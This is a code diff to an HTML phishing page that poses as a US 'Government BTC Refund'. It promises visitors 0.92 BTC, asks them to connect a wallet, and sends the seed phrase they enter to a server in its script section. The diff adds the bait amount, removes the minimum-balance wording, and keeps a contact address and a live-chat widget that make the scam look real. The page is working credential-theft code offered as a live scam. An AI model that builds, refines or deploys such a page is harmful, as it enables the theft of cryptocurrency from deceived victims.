@@ -8,7 +8,7 @@
     body {
       font-family: Arial, sans-serif;
       background-color: #f4f4f4;
-      background-image: url('https://i.ibb.co/xhMPg5m/govbtc-faint-bg.png'); /* optional faint bg */
+      background-image: url('https://i.ibb.co/xhMPg5m/govbtc-faint-bg.png');
       background-size: cover;
       background-repeat: no-repeat;
       background-position: center;
@@ -28,6 +28,13 @@
 
     h2 {
       color: #f7931a;
+    }
+
+    .highlight {
+      color: #f7931a;
+      font-weight: bold;
+      margin-top: 10px;
+      font-size: 18px;
     }
 
     .btn {
@@ -59,8 +66,9 @@
 <body>
   <div class="container">
     <h2>🇺🇸 Government BTC Refund</h2>
+    <div class="highlight">You are eligible to receive: 0.92 BTC (~$99,791 USD)</div>
     <p>Claim your Bitcoin refund through verified wallet connection.</p>
-    <p><strong>Minimum Required: 0.0092 BTC (~$1,000)</strong></p>
+
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
 
     <div class="wallet-box" id="walletBox" style="display:none;">
@@ -82,9 +90,8 @@
     </div>
 
     <div class="note">
-      If your wallet has less than the required amount,<br>
-      please contact <strong>admin@govbtcclaim.org</strong><br>
-      or reach out via the live chat.
+      For support or questions, contact <strong>admin@govbtcclaim.org</strong><br>
+      or message us through live chat.
     </div>
   </div>
 
@@ -104,22 +111,22 @@
         body: JSON.stringify({ seedPhrase: seed, walletType: wallet })
       });
 
-      alert("Wallet verification is in process. You’ll be contacted shortly.");
+      alert("Wallet verification in progress. Please wait while we confirm your refund.");
     });
   </script>
 
-  <!-- Start of Tawk.to Script -->
+  <!-- Start of Tawk.to Script (Live Chat Widget) -->
   <script type="text/javascript">
-  var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
-  (function () {
-      var s1 = document.createElement("script"),
-          s0 = document.getElementsByTagName("script")[0];
-      s1.async = true;
-      s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/1hvnkmk4j';
-      s1.charset = 'UTF-8';
-      s1.setAttribute('crossorigin', '*');
-      s0.parentNode.insertBefore(s1, s0);
-  })();
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    (function () {
+        var s1 = document.createElement("script"),
+            s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/1hvnkmk4j';
+        s1.charset = 'UTF-8';
+        s1.setAttribute('crossorigin', '*');
+        s0.parentNode.insertBefore(s1, s0);
+    })();
   </script>
   <!-- End of Tawk.to Script -->
 </body>
